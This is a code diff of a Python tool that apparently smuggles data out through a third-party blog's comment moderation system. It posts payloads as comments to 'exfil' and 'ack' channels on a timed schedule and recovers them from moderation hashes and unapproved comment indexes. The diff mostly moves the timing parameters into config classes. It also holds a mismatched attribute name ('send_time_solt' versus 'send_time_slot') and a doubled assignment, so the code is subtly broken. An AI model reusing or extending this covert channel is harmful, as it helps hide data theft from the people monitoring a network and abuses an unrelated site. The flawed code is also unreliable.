@@ -7,24 +7,33 @@ import hmac
 import urllib.parse
 from bs4 import BeautifulSoup
 
+class SendConfig:
+    send_time_solt = None
+    confirm_time_slot = None
+
+class ReceiveConfig:
+    recv_time_slot = None
+    process_time_slot = None
+    prev_unapproved_index = None
+
 class Message:
-    message = ""
-    message_id = ""
+    message = None
+    message_id = None
 
 class Channel:
-    target_blog = ""
-    exfil_channel_id = 0
-    ack_channel_id = 0
-    exfil_channel = ""
-    ack_channel = ""
+    target_blog = None
+    exfil_channel_id = None
+    ack_channel_id = None
+    exfil_channel = None
+    ack_channel = None
 
 class CommentResponse:
     is_success = False
-    url = ""
-    unapproved_index = 0
-    moderation_hash = ""
-    html_response_code = ""
-    html_response = ""
+    url = None
+    unapproved_index = None
+    moderation_hash = None
+    html_response_code = None
+    html_response = None
 
     def __init__(self, raw_response):
         response_splitted = raw_response.split("\n")
@@ -75,10 +84,6 @@ def delay_to_timeslot(time_slot):
 
 def generate_random_string(length):
     return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))
-
-import datetime
-
-# current_datetime = datetime.datetime.utcnow()
 
 def get_next_timeslot_date(current_datetime, target_timeslot):
     current_minute = current_datetime.time().minute
@@ -150,17 +155,17 @@ def get_moderation_hash_from_url(url):
     else:
         return None
 
-def send_data(channel, data, send_time_slot, confirm_time_slot):
+def send_data(channel, data, send_config):
     while True:
-        delay_to_timeslot(send_time_slot)
+        delay_to_timeslot(send_config.send_time_slot)
 
         print("Triggered at: " + str(datetime.datetime.now().time()))
 
         response = submit_comment(channel.target_blog, channel.exfil_channel_id, data.message)
         print(response.moderation_hash)
 
-        if confirm_time_slot:
-            delay_to_timeslot(confirm_time_slot)
+        if send_config.confirm_time_slot:
+            delay_to_timeslot(send_config.confirm_time_slot)
             response = response = submit_comment(channel.target_blog, channel.ack_channel_id, data.message_id)
             print("## html_response: " + str(response.html_response))
             if "Duplicate" in response.html_response:
@@ -184,17 +189,17 @@ def get_moderation_hash_at_current_time(channel):
 
     return response.moderation_hash, response.unapproved_index
 
-def receive_data(channel, num_of_receivers, recv_time_slot, process_time_slot, prev_unapproved_index):
+def receive_data(channel, num_of_receivers, recv_config):
     received_data = []
     
-    print("[INFO] Delaying to client timeslot. " + str(recv_time_slot))
-    delay_to_timeslot(recv_time_slot)
+    print("[INFO] Delaying to client timeslot. " + str(recv_config.recv_time_slot))
+    delay_to_timeslot(recv_config.recv_time_slot)
     current_hash, server_index = get_moderation_hash_at_current_time(channel)
 
     print("[INFO] Current hash is: " + current_hash)
-    print("[INFO] Delaying to server timeslot. " + str(process_time_slot))
+    print("[INFO] Delaying to server timeslot. " + str(recv_config.process_time_slot))
 
-    delay_to_timeslot(process_time_slot)
+    delay_to_timeslot(recv_config.process_time_slot)
 
     index_client = 0
     processed_unapproved_indexes = []
@@ -203,8 +208,8 @@ def receive_data(channel, num_of_receivers, recv_time_slot, process_time_slot, p
         print("## checking index_client: " + str(index_client))
         
         for index_offset in range(1, num_of_receivers + 1 + 1):
-            print("## prev_unapproved_index: " + str(prev_unapproved_index) + ", index_offset: " + str(index_offset))
-            current_unapproved_index = prev_unapproved_index + index_offset
+            print("## recv_config.prev_unapproved_index: " + str(recv_config.prev_unapproved_index) + ", index_offset: " + str(index_offset))
+            current_unapproved_index = recv_config.prev_unapproved_index + index_offset
             print("## " + str(current_unapproved_index) + " in? " + str(processed_unapproved_indexes))
             if current_unapproved_index == server_index:
                 index_client += 1
@@ -230,7 +235,7 @@ def receive_data(channel, num_of_receivers, recv_time_slot, process_time_slot, p
                     
                     break
             else:
-                print("[INFO] No comment for moderation for " + str(recv_time_slot) + " using index " + str(current_unapproved_index) + ". Skipping...")
+                print("[INFO] No comment for moderation for " + str(recv_config.recv_time_slot) + " using index " + str(current_unapproved_index) + ". Skipping...")
             index_client += 1
 
     return received_data
